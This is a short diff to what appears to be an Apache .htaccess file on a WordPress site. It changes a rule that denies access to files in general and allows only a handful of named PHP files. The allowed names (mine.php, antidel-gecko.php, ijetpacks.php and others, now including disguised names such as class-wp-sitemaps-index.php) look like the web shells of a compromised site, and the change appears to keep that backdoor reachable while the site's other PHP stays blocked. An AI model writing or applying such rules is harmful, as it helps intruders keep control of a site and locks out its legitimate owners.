@@ -3,7 +3,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(mine.php|ijetpacks.php|antidel-gecko.php|name.php|index.php|Duception.php)$">
+<FilesMatch "^(mine.php|ijetpacks.php|antidel-gecko.php|name.php|themes.php|nivo-image-slider.php|class-wp-sitemaps-index.php|edit-tags.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
